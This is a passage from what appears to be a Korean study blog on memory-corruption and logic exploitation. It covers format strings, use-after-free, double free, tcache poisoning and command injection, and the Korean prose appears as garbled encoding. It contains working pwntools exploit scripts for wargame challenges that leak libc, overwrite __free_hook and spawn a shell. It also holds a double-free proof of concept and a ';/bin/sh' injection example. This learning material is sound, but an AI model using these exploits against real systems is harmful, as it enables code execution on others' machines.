payload = b&#34;%1337c%8$n&#34;.ljust(16,b&#39;A&#39;)
payload += p64(addr_changeme)
print(&#39;payload:&#39;, payload)
# 1337 ê¸¸ì´ì˜ ì–´ë–¤ ë¬¸ìë¥¼ ì¶œë ¥í•˜ê³ (ë¬´ìŠ¨ ë¬¸ìê°€ ë ì§€ëŠ” ëª¨ë¦„)
# 1337ì„ rsp[0x18] ì— ë®ì–´ì“°ê²Œ í•˜ê¸° ìœ„í•´ 16ìë¦¬ê¹Œì§€ëŠ” FSB ìœ ë°œ ë°ì´í„° + dummy string ìœ¼ë¡œ ì±„ìš°ê³ 
# 17ìë¦¬ë¶€í„° 24ìë¦¬ê¹Œì§€ changeme ë³€ìˆ˜ì˜ ì£¼ì†Œë¡œ ì±„ìš´ë‹¤.
# ì´ë ‡ê²Œ ë˜ë©´ stack ì—ì„œ rsp[0] ~ rsp[16] ê¹Œì§€ëŠ” FSB ìœ ë°œ ë°ì´í„° + dummy string ì´ ë“¤ì–´ê°€ê³ 
# rsp[17] ~ rsp[24] ê¹Œì§€ëŠ” changeme ë³€ìˆ˜ì˜ ì£¼ì†Œê°€ ë‹´ê¸°ê²Œ ëœë‹¤.
p.sendline(payload)

p.interactive()
</code></pre></li></ul><h3 id=use-after-free>Use-After-Free<a hidden class=anchor aria-hidden=true href=#use-after-free>#</a></h3><ul><li><p>ë©”ëª¨ë¦¬ë¥¼ í•´ì œí•˜ëŠë¼ free ë¥¼ í˜¸ì¶œí•˜ë©´ free í•¨ìˆ˜ëŠ” ë©”ëª¨ë¦¬ë¥¼ <code>ptmalloc</code> ì— ë°˜í™˜í•  ë¿, ë©”ëª¨ë¦¬ ì˜ì—­ì„ ì´ˆê¸°í™” í•˜ê±°ë‚˜ í¬ì¸í„°ë¥¼ ì´ˆê¸°í™” í•˜ì§€ëŠ” ì•ŠëŠ”ë‹¤.</p><ul><li><a href=../../computerscience/computer_science/#ptmalloc title="pthread malloc">ptmalloc ì°¸ì¡°</a></li></ul></li><li><p>free í•¨ìˆ˜ë¥¼ í˜¸ì¶œ í•œ ì´í›„ í¬ì¸í„°ëŠ” <code>dangling pointer</code> ê°€ ë˜ì–´ í•´ì œëœ chunk ì˜ì—­ì„ ê°€ë¦¬í‚¤ê²Œ ëœë‹¤.</p></li><li><p><code>dangling pointer</code> ë¥¼ í™œìš©í•˜ì—¬ í•´ì œëœ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ì—¬ ë°œìƒí•  ìˆ˜ ìˆëŠ” ë³´ì•ˆ ì·¨ì•½ì ì„ <code>UAF</code>(<code>Use-After-Free</code>) ë¼ í•˜ë©°, <code>dangling pointer</code> ê°€ ê°€ë¦¬í‚¤ëŠ” ë©”ëª¨ë¦¬ê°€ í•´ì œë˜ê¸° ì „ì— ë‹´ê³  ìˆì—ˆë˜ ë°ì´í„°ê°€ ìœ ì¶œ ë  ìˆ˜ ìˆë‹¤.</p></li><li><p><code>unsortedbin</code> ì˜ ì²« chunk ëŠ” libc ì˜ì—­ì˜ íŠ¹ì • êµ¬ì—­ê³¼ ì—°ê²°ëœë‹¤. ì¦‰, ì²« chunk ì˜ <code>fd</code> ì™€ <code>bk</code> ì˜ì—­ì—ëŠ” libc ì˜ì—­ì˜ ì£¼ì†Œê°€ ê¸°ë¡ëœë‹¤ëŠ” ì ì„ í™œìš©í•˜ì—¬ libc_base ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. <a href=../../computerscience/computer_science/#ptmalloc title="pthread malloc">ptmalloc ì°¸ì¡°</a></p></li><li><p>exploit ì¡°ê±´</p><ol><li>unsortedbin ì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆëŠ” í¬ê¸°ì˜ heap ì„ í• ë‹¹ í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤.</li><li>heap ì„ ì›í•  ë•Œ í•´ì œ í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤. (unsorted bin ì˜ chunk ì™€ top chunk ì™€ ë¶™ì§€ ì•Šê²Œ ì¡°ì ˆ í•„ìš”)</li><li>uaf ì·¨ì•½ì ì´ ìˆì–´ì•¼ í•œë‹¤. (heap ì—ì„œ í•¨ìˆ˜ í¬ì¸í„° ì£¼ì†Œë¥¼ ì½ì–´ ì‹¤í–‰í•˜ëŠ” êµ¬ë¬¸ ì¡´ì¬)</li><li>ì‹¤í–‰íŒŒì¼ ë° ì†ŒìŠ¤ì½”ë“œ í™•ë³´</li></ol></li><li><p>exploit ë°©ë²•</p><ol><li><p>libc_base ì™€ íŠ¹ì • ë©”ëª¨ë¦¬ì˜ <code>fd</code> í˜¹ì€ <code>bk</code> ê°„ ê±°ë¦¬(index) ë¥¼ ì°¾ì•„ë‚¸ë‹¤.</p><ul><li><code>gdb</code>ì—ì„œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¨ í›„ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³  í•´ì œí•˜ì—¬ <code>unsortedbin</code> ì˜ì—­ì— chunk ë¥¼ ìƒì„±ì‹œí‚¤ê³ , <code>heap</code> ëª…ë ¹ìœ¼ë¡œ ê·¸ chunk ì˜ <code>fd</code> ë‚˜ <code>bk</code> ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ì¶”ì¶œí•œë‹¤. (1024 ì´ìƒ ë©”ëª¨ë¦¬ í• ë‹¹ í•„ìš”)</li></ul><pre tabindex=0><code>Free chunk (largebins) | PREV_INUSE
Addr: 0x555555559290
Size: 0x510 (with flag bits: 0x511)
fd: 0x7ffff7fb8010
bk: 0x7ffff7fb8010
fd_nextsize: 0x555555559290
bk_nextsize: 0x555555559290
</code></pre><ul><li><code>vmmap</code> ì„ ì‚¬ìš©í•´ libc_base ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤. (ì˜ˆì‹œì—ì„œëŠ” <code>0x7ffff7dcb000</code>)</li></ul><pre tabindex=0><code> 0x555555559000     0x55555557a000 rw-p    21000      0 [heap]
 0x7fff4d31f000     0x7ffff7dcb000 rw-p aaaac000      0 [anon_7fff4d31f]
 0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]
 0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
</code></pre><ul><li>libc_base ì£¼ì†Œì—ì„œ <code>fd</code> ì— ì €ì¥ëœ ì£¼ì†Œë¥¼ ë¹¼ê³ , 96 ì˜ offsetì„ ì¶”ê°€ë¡œ ë¹¼ì„œ libc_base ì™€ <code>fd</code> ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œ index ë¥¼ ì°¾ëŠ”ë‹¤. <code>0x7ffff7fb8010</code> - <code>0x7ffff7dcb000</code> = <code>0x1ED010</code></li><li>index ëŠ” ìƒëŒ€ì ì¸ ê°’ì´ë¯€ë¡œ í”„ë¡œê·¸ë¨ì¼ ë‹¤ì‹œ ì‹¤í–‰ì‹œì¼œ libc_base ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ ëœë¤í•˜ê²Œ ë³€ê²½ë˜ì–´ë„, index ëŠ” ë³€í•˜ì§€ ì•ŠëŠ”ë‹¤.</li></ul></li><li><p>exploit ì— ì‚¬ìš©í•  ROP chain ì„ êµ¬í•œë‹¤.</p><ul><li>one-gadget ì„ ì´ìš©í•  ìˆ˜ë„ ìˆë‹¤. <code>libc</code> íŒŒì¼ì„ one-gadgetìœ¼ë¡œ ë¶„ì„í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.<pre tabindex=0><code>$ one_gadget /lib/x86_64-linux-gnu/libc.so.6

0xe3afe execve(&#34;/bin/sh&#34;, r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve(&#34;/bin/sh&#34;, r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve(&#34;/bin/sh&#34;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
</code></pre><ul><li>ì´í›„ <code>gdb</code> ì—ì„œ <code>i r</code> ëª…ë ¹ìœ¼ë¡œ ë ˆì§€ìŠ¤í„° ìƒí™©ì„ ë³´ê³  ì¡°ê±´ì— ë§ëŠ” one-gadget ì„ ì„ íƒí•œë‹¤.</li></ul><pre tabindex=0><code>i r
i r
rax            0xfffffffffffffe00  -512
rbx            0x3                 3
rcx            0x7ffff7ed91f2      140737352929778
rdx            0x5555513f          1431654719
rsi            0x7fff4d31f010      140734488506384
rdi            0x0                 0
rbp            0x7fffffffdee0      0x7fffffffdee0
rsp            0x7fffffffdeb8      0x7fffffffdeb8
r8             0x6                 6
r9             0x6                 6
r10            0x555555556073      93824992239731
r11            0x246               582
r12            0x555555555140      93824992235840
r13            0x7fffffffdff0      140737488347120
r14            0x0                 0
r15            0x0                 0
rip            0x7ffff7ed91f2      0x7ffff7ed91f2 &lt;__GI___libc_read+18&gt;
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
</code></pre></li></ul></li></ol><ul><li><a href=https://dreamhack.io/wargame/challenges/357>ë¬¸ì œ</a> í•´ê²° ì˜ˆì œ ì½”ë“œ<pre tabindex=0><code>from pwn import *

DUMMY_DATA = &#39;A&#39;
OFFSET = 0x3ebca0
ONE_GADGET = 0x10a41c

# p = process(&#39;a.out&#39;, env= {&#34;LD_PRELOAD&#34; : &#34;libc-2.27.so&#34;})

# alloc1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())
p.sendlineafter(b&#34;idx:&#34;, b&#39;-1&#39;)

# alloc2 &amp; free alloc1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())
p.sendlineafter(b&#34;idx:&#34;, b&#39;0&#39;)

# alloc 3 (reuse chunk of &#39;alloc1&#39;)
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())

p.recvuntil(b&#39;Data: &#39;)
fd = u64(p.recvline()[:-1].ljust(8, b&#39;\x00&#39;))  # fd ê°’ ì¶”ì¶œ

p.sendlineafter(b&#34;idx:&#34;, b&#39;-1&#39;) # ì”ì—¬ ê³¼ì • ì²˜ë¦¬

print(&#39;fd:&#39;, hex(fd))
offset = OFFSET + ord(DUMMY_DATA) - (OFFSET&amp;0xFF)  # ë®ì–´ì“´ DUMMY_DATAê°’ì„ ê³ ë ¤í•˜ì—¬ ê³„ì‚°í•œë‹¤.
print(&#39;offset:&#39;, hex(offset))
libc_base = fd - offset  # ìœ ì¶œëœ fd ê°’ìœ¼ë¡œ libc_base ê°’ ê³„ì‚°
print(&#39;libc_base:&#39;, hex(libc_base))
gadget = libc_base + ONE_GADGET
print(&#39;gadget:&#39;, hex(gadget))

# alloc struct1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;1&#39;)
p.sendlineafter(b&#34;Weight:&#34;, b&#39;1&#39;)
p.sendlineafter(b&#34;Age:&#34;, str(gadget).encode())  # íŠ¹ì • êµ¬ì—­ì— gadget ì£¼ì…

# alloc struct2
p.sendlineafter(b&#34;&gt; &#34;, b&#39;2&#39;)
p.sendlineafter(b&#34;Weight:&#34;, b&#39;1&#39;)
# struct1 ì˜ Age ì˜ì—­ì´ strucut2 êµ¬ì—­ì„œëŠ” í•¨ìˆ˜ í¬ì¸í„°ì´ë‹¤. ì•„ê¹Œ ì£¼ì…í•œ gadget ì´ ì‹¤í–‰ëœë‹¤.

p.interactive()                         
</code></pre></li></ul></li></ul><h3 id=doubly-free-bug>Doubly Free Bug<a hidden class=anchor aria-hidden=true href=#doubly-free-bug>#</a></h3><ul><li><code>ptmalloc2</code> ì‹œìŠ¤í…œì—ì„œ ì´ë¯¸ free ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>tcache</code> ë‚˜ <code>bins</code> ì— í¬í•¨ëœ <code>chunk</code> ë¥¼ í•œë²ˆ ë” free í•˜ì—¬ ì·¨ì•½ì ì„ ë°œìƒì‹œí‚¤ëŠ” ê³µê²© ê¸°ë²•ì´ë‹¤.</li><li>ê³µê²©ìê°€ ì„ì˜ì˜ ì£¼ì†Œë¥¼ read / write / execute í•  ìˆ˜ ìˆê³ , Denial of Service ë„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</li><li>íŠ¹ì • í¬ì¸í„°ì— ëŒ€í•´ free ë¥¼ í˜¸ì¶œí•œ í›„ ì´ˆê¸°í™”ë¥¼ í•˜ì§€ ì•Šìœ¼ë©´ <code>dangling pointer</code> ê°€ ìƒì„±ëœë‹¤. <code>dangling pointer</code> ë¥¼ í•œ ë²ˆ ë” free í•˜ê²Œ ë˜ë©´ <code>tcache</code> ë‚˜ <code>bin</code> ì— ë™ì¼í•œ ë‚´ìš©ì˜ ìƒˆë¡œìš´ <code>chunk</code> ê°€ ì¶”ê°€ëœë‹¤.<pre tabindex=0><code>1. alloc
    bins      heap
     -      [chunk1]

2. free
    bins      heap
  [chunk1]      -

3. free again
    bins      heap
  [chunk1]      -
  [chunk1]

4. alloc same size
    bins      heap
  [chunk1]   [chunk1]
# ê°™ì€ ì£¼ì†Œ ì˜ì—­ì´ bin ê³¼ heap ì— ë‘˜ë‹¤ ì¡´ì¬
# heap ì˜ì—­ì— ìˆëŠ” [chunk1] ì˜ fd ìœ„ì¹˜ì™€ bk ìœ„ì¹˜ë¥¼ ì¡°ì‘í•˜ë©´ bins ì— ì„ì˜ì˜ ì£¼ì†Œë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆë‹¤.
</code></pre><ul><li>glibc 2.26ì—ì„œ ë§ì´ ì‚¬ìš©ëœ ê³µê²© ê¸°ë²•ì´ì§€ë§Œ, ìµœì‹  libc ì—ì„œëŠ” ì¤‘ë³µ free ë¥¼ ë°©ì§€í•˜ëŠ” ì½”ë“œê°€ ìˆì–´, ìš°íšŒí•˜ì§€ ì•Šìœ¼ë©´ í”„ë¡œê·¸ë¨ì´ ìë™ìœ¼ë¡œ ì¢…ë£Œëœë‹¤.<ul><li>free ëœ chunk ë“¤ì€ chunk + 8 ì˜ì—­ì— <code>tcache_entry</code> êµ¬ì¡°ì²´ë¥¼ ê°–ê²Œ ëœë‹¤.</li><li><code>tcache_entry</code> ëŠ” free í•  ë•Œ <code>tcache_perthread</code> ê°’ìœ¼ë¡œ ì„¤ì •ë˜ê³ , í• ë‹¹ ë  ë•Œ ë‹¤ì‹œ ì´ˆê¸°í™” ëœë‹¤.<ul><li><code>tcache_perthread</code> ëŠ” thread ë§ˆë‹¤ ê°–ê³  ìˆëŠ” êµ¬ì¡°ì²´ë¡œ, tcache ì— ë°°ì •ëœ chunk list ë¥¼ ê´€ë¦¬í•œë‹¤.</li></ul></li><li>chunk ë¥¼ free í•  ë•Œ chunk ì˜ <code>tcache_entry</code> ë¶€ë¶„ì´ <code>tcache_perthread</code> ì™€ ì¼ì¹˜í•˜ì§€ ì•Šìœ¼ë©´ ë³´í˜¸ê¸°ë²•ì„ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.</li></ul><pre tabindex=0><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
  void *chunk = malloc(0x20);
  printf(&#34;Chunk to be double-freed: %p\n&#34;, chunk);
  free(chunk);
  *(char *)(chunk + 8) = 0xff;  // tcache_entry êµ¬ì¡°ì²´(chunk-&gt;key) ì˜ ì£¼ì†Œë¥¼ ì˜¤ì—¼ì‹œí‚¨ë‹¤.
  free(chunk);                  // ë³€ì¡°ë¥¼ í–ˆê¸° ë•Œë¬¸ì— í•œ ë²ˆ ë” free ê°€ ê°€ëŠ¥í•˜ë‹¤.
  printf(&#34;First allocation: %p\n&#34;, malloc(0x20));
  printf(&#34;Second allocation: %p\n&#34;, malloc(0x20));
  return 0;
}
</code></pre></li></ul></li></ul><h4 id=tcache-poisoning>Tcache Poisoning<a hidden class=anchor aria-hidden=true href=#tcache-poisoning>#</a></h4><ul><li><p><code>Doubly Free Bug</code> ì·¨ì•½ì ì„ í™œìš©í•˜ì—¬ <code>tcache</code> ë¥¼ ì¡°ì‘í•˜ëŠ” ê³µê²© ê¸°ë²•ì´ë‹¤.</p></li><li><p>2íšŒ ì´ìƒ free ëœ chunk ë¥¼ ì¬í• ë‹¬ í•˜ë©´ ì„ì˜ ì£¼ì†Œì— chunk ë¥¼ í• ë‹¹ì‹œí‚¤ëŠ” (<code>tcache</code> ì¡°ì‘) í•  ìˆ˜ ìˆë‹¤.</p><ul><li>AAR(Arbitrary Address Read) : ì„ì˜ì˜ ì£¼ì†Œë¥¼ ì½ì„ ìˆ˜ ìˆìŒ</li><li>AAW(Arbitrary Address Write) : ì„ì˜ì˜ ì£¼ì†Œì— ì“¸ ìˆ˜ ìˆìŒ</li></ul></li><li><p>exploit ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.</p><ul><li><p>ì¡°ê±´:</p><ol><li>double free ì·¨ì•½ì  ì¡´ì¬</li><li>ì‹¤í–‰íŒŒì¼ ë° ì†ŒìŠ¤ì½”ë“œ í™•ë³´</li><li>ì½”ë“œìƒ <code>stdout</code> í˜¸ì¶œ<ul><li><code>stdout</code> ì€ libc ì— ì •ì˜ëœ ê°’ìœ¼ë¡œ, ì½”ë“œìƒì—ì„œ ì´ë¥¼ í˜¸ì¶œí•˜ë©´ <code>.bss</code> ì˜ì—­ì— libc ì˜ì—­ì„ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œ <code>_IO_2_1_stdout_</code> ê°€ ë‹´ê¸°ê²Œ ëœë‹¤.</li></ul></li></ol></li><li><p>ì ˆì°¨:</p><ol><li><code>AAR</code>(Arbitrary Address Read) ë¡œ libc_base ì£¼ì†Œë¥¼ ì¶”ì¶œí•œë‹¤.</li><li><code>AAW</code>(Arbitrary Address Write) ë¡œ hook ì„ overwrite í•œë‹¤.<ul><li><code>readelf -s</code> ë¡œ __free_hook ì˜ ì£¼ì†Œë¥¼ ì°¾ëŠ”ë‹¤.<pre tabindex=0><code>221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
</code></pre></li></ul></li></ol></li><li><p><a href=https://dreamhack.io/wargame/challenges/358/>ë¬¸ì œ</a> í•´ê²° ì˜ˆì œì½”ë“œ</p><pre tabindex=0><code>from pwn import *

PROGRAM = &#39;tcache_poison&#39;
PAYLOAD = &#39;A&#39;
GADGET = 0x4f432

p = process(PROGRAM)
e = ELF(PROGRAM)
lib = ELF(&#39;libc-2.27.so&#39;)

###############
# 1. Doubly free memory
###############
# alloc chunk1
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; NULL
# --------------------------

# free chunk1
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

# tcache: (*) -&gt; chunk1
# --------------------------

# edit chunk1 (already freed)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;4&#39;)
p.sendafter(b&#39;Edit chunk:&#39;, b&#39;A&#39; * 8 + b&#39;\x00&#39;)  # corrupt tcache_entry to free again

# free chunk1 again &lt;- Doubly Free Bug
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)
# ì´ì œ tcache ì—ëŠ” ë™ì¼í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ëŠ” ë‘ ê°œì˜ chunk ê°€ ìƒê²¼ë‹¤.
# tcache: (*) -&gt; chunk1 -&gt; chunk1
# --------------------------

###############
# 2. Poison tcache 
###############
offset_stdout = e.symbols[&#39;stdout&#39;]
print(&#39;offset_stdout:&#39;, hex(offset_stdout))

p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, p64(offset_stdout))


# tcache: (*) -&gt; chunk1 -&gt; stdout -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; stdout -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

# pop stdout
# stdout ì˜ ì‹¤ì œ ê°’ì— ì˜í–¥ì„ ì£¼ì§€ ì•Šê³  í”„ë¡œê·¸ë¨ ë¡œì§ì„ í†µí•´ tcache ì—ì„œ stdout ë¥¼ pop í•˜ë ¤ë©´
# _IO_2_1_stdout_ ê°’ì„ ê·¸ëŒ€ë¡œ write í•´ì£¼ë©´ì„œ alloc ì„ í•´ì•¼í•œë‹¤. 
# ì „ì²´ë¥¼ write í•˜ëŠ” ëŒ€ì‹  ë§ˆì§€ë§‰ byte í•˜ë‚˜ë§Œ ë®ì–´ì¨ë„ ë¬¸ì œ ì—†ë‹¤.
lsb_of__IO_2_1_stdout_ = p64(lib.symbols[&#39;_IO_2_1_stdout_&#39;])[0:1] # least significant byte of _IO_2_1_stdout_
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, lsb_of__IO_2_1_stdout_)
print(&#39;lsb_of__IO_2_1_stdout_:&#39;, lsb_of__IO_2_1_stdout_)

# tcache: (*) -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

###############
# 3. leak address into stdout
###############
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;3&#39;)
p.recvuntil(b&#39;Content: &#39;)
addr_stdout = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))

print(&#39;addr_stdout:&#39;, hex(addr_stdout))
libc_base = addr_stdout - lib.symbols[&#39;_IO_2_1_stdout_&#39;]
print(&#39;libc_base:&#39;, hex(libc_base))

###############
# 4. overwrite __free_hook
###############
offset_free_hook = lib.symbols[&#39;__free_hook&#39;]
print(&#39;offset_free_hook:&#39;, hex(offset_free_hook))
addr_free_hook = libc_base + offset_free_hook
print(&#39;addr_free_hook:&#39;, hex(addr_free_hook))

# ì•ì„œ ìˆ˜í–‰í•œ ê²ƒ ì²˜ëŸ¼, doubly free memory ë¥¼ í•œë²ˆ ë” ë°œìƒì‹œí‚¨ë‹¤.
# chunk1 ê³¼ ë‹¤ë¥¸ í¬ê¸°ì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•´ì•¼ í•¨ì— ì£¼ì˜í•œë‹¤
# Doubly free memory
# alloc chunk2
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; NULL
# --------------------------

# free chunk2
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

# tcache: (*) -&gt; chunk2
# --------------------------

# edit chunk2 (already freed)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;4&#39;)
p.sendafter(b&#39;Edit chunk:&#39;, b&#39;A&#39; * 8 + b&#39;\x00&#39;)  # corrupt tcache_entry to free again

# free chunk2 again &lt;- Doubly Free Bug
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)
# ì´ì œ tcache ì—ëŠ” ë™ì¼í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ëŠ” ë‘ ê°œì˜ chunk ê°€ ìƒê²¼ë‹¤.
# tcache: (*) -&gt; chunk2 -&gt; chunk2
# --------------------------

# Poison tcache 
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, p64(addr_free_hook))

# tcache: (*) -&gt; chunk2 -&gt; __free_hook -&gt; ...
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; __free_hook -&gt; ... 
# --------------------------

# pop __free_hook &amp; overwrite __free_hook with gadget
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, p64(libc_base + GADGET))
print(&#39;gadget:&#39;, hex(libc_base + GADGET))
# tcache: (*) -&gt; ... 
# --------------------------

# call free (contaminated)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

p.interactive()
</code></pre></li></ul></li></ul><h3 id=logical-error>Logical Error<a hidden class=anchor aria-hidden=true href=#logical-error>#</a></h3><ul><li>OS ë‚˜ ì»´íŒŒì¼ëŸ¬ì˜ êµ¬ì¡°ì  ì·¨ì•½ì  ë¿ ì•„ë‹ˆë¼ ê°œë°œìì˜ ì‹¤ìˆ˜ì— ì˜í•œ ì·¨ì•½ì ë„ exploit ì— ì‚¬ìš©ë  ìˆ˜ ìˆë‹¤.</li></ul><h4 id=type-error>Type Error<a hidden class=anchor aria-hidden=true href=#type-error>#</a></h4><ul><li>ë³€ìˆ˜ì— ë‹´ê²Œ ë  ê°’ì˜ í¬ê¸°, ìš©ë„, ë¶€í˜¸ ì—¬ë¶€ë¥¼ ê³ ë ¤í•˜ì§€ ì•Šê³  ì •ì˜ëœ ë³€ìˆ˜ì— ì˜í•´ ì˜ë„ì¹˜ ì•Šì€ ë™ì‘ì„ ìœ ë°œí•˜ëŠ” ì—ëŸ¬</li><li><code>out of range</code> : ë³€ìˆ˜ì— ë‹´ì„ ìˆ˜ ìˆëŠ” ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ê°’ì„ ì €ì¥í•˜ì—¬ ê°’ì´ ì˜ë¦¬ê±°ë‚˜ ë¶€í˜¸ê°€ ë°˜ì „ë˜ëŠ” í˜„ìƒ<ul><li>overflow : ê°’ì´ ì˜ë ¤ì„œ ì˜ˆìƒ ê°’ë³´ë‹¤ ì»¤ì§€ëŠ” í˜„ìƒ (unsigned char ì— 256 ëŒ€ì…)</li><li>underflow : í‘œí˜„í•  ìˆ˜ ì—†ëŠ” ê°’ì„ ë³€ìˆ˜ì— ëŒ€ì…í•˜ì—¬ ì˜ˆìƒ ê°’ë³´ë‹¤ ì‘ì•„ì§€ëŠ” í˜„ìƒ (unsigned int ì— -1 ëŒ€ì…)</li></ul></li></ul><h4 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h4><ul><li>C ì–¸ì–´ì—ì„œ <code>system</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì»¤ë„ ëª…ë ¹ì–´ë¥¼ í˜¸ì¶œí•˜ë„ë¡ í”„ë¡œê·¸ë˜ë°ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.<ul><li><code>system</code> í•¨ìˆ˜ëŠ” <code>execve</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ëœë‹¤.</li></ul></li><li><code>Metacharacter</code> ë¥¼ ì´ìš©í•´ íŠ¹ì • ëª…ë ¹ì–´ ì´í›„ &ldquo;/bin/sh&rdquo; ë¥¼ ëª…ë ¹ì–´ë¡œ ì…ë ¥í•˜ê²Œ ë˜ë©´ ì‰˜ ê¶Œí•œì„ íƒˆì·¨ ë‹¹í•˜ê²Œ ëœë‹¤.<ul><li>ex) <code>system("cat file.txt;/bin/sh")</code>: ì˜ë„í•œ ë™ì‘ì€ <code>cat file.txt</code> ê¹Œì§€ì§€ë§Œ, <code>/bih/sh</code> ë¥¼ ì¶”ê°€ë¡œ í˜¸ì¶œí•˜ì˜€ë‹¤.</li></ul></li></ul><h4 id=path-traversal>Path Traversal<a hidden class=anchor aria-hidden=true href=#path-traversal>#</a></h4><ul><li>í—ˆìš©ë˜ì§€ ì•Šì€ ê²½ë¡œì— ì‚¬ìš©ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì </li><li>ì„ì˜ì˜ íŒŒì¼ì„ ì½ê³ /ì“°ê³ /ì‹¤í–‰ ì‹œí‚¬ ìˆ˜ ìˆëŠ” 